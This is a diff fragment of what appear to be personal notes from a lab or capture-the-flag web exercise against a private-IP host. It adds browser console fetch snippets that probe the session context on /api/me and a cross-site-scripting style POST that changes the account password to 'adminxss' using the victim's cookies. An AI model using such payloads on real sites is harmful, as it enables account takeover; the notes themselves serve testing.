@@ -388,3 +388,27 @@ fetch('https://192.168.62.62:8443/api/me/password', {
   })
 });
 ```
+methods to test what context the session token is running in by using the console commands:
+1.
+```bash
+fetch("https://192.168.62.62:8443/api/me", {
+  credentials: "include"
+}).then(r => r.json()).then(console.log);
+```
+2.
+```bash
+fetch("https://localhost:8443/api/me", {
+  credentials: "include"
+}).then(r => r.json()).then(console.log);
+```
+attempting to bypass prefetch error
+```bash
+fetch("/api/me/password", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded"
+  },
+  body: "password=adminxss",
+  credentials: "include"
+});
+```
